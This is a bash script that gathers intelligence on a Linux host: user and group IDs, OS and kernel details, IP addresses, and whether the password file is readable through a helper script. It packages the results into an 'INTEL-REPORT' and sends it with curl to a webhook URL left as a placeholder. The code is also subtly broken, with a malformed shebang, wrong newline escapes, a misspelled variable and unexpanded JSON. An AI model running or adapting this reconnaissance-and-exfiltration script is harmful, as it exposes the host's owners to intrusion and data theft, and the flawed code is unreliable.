#/bin/bash

# intel commands
commands=(
    "OS_name=$(uname -o)"
    "processor=$(uname -p)"
    "kernel_version_date=$(uname -v | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2}')"
    "architecture=$(arch)"
    "user_name=$(whoami)"
    "os_ip=$(hostname -I | tr ' ' '/n')"
    "user_id=$(id | awk -F'uid=' '{print $2}' | grep -oE -m1 '^[0-9]{1,4}')"
    "group_id=$(id | awk -F'gid=' '{print $2}' | grep -oE -m1 '^[0-9]{1,4}')"
    "is_passwd_accessible=$(./passwd_access.sh)"
)

# handling errors
for cmd in "${commands[@]}"; do
    if ! output=$(${cmd} 2>&1); then
        echo "Error on ${cmd} : ${output}"
    fi
done
if [[ $(uname) != "Linux" ]]; then
    echo "intel gathering impossible or your machine is not Linux."
    exit 1
fi

# notify
WEBHOOK="<webhook url>"
MESSAGE="==========INTEL-REPORT==========/n
        -----------user-----------n
        User : ${user_name}/n
        UID : ${user_id}/n
        GID : ${group_id}/n
        -----------uname-----------n
        Os : ${OST_name}/n
        Processor : ${processor}/n
        Kerner Version Date : ${kernel_version_date}/n
        -----------others-----------n
        Addresses : ${os_ip}/n
        Access to password file ? : ${is_passwd_accessible}/n
        "

curl -H 'Content-type: application/json' -X POST -d '{"content" : "${MESSAGE}"}' "${WEBHOOK}"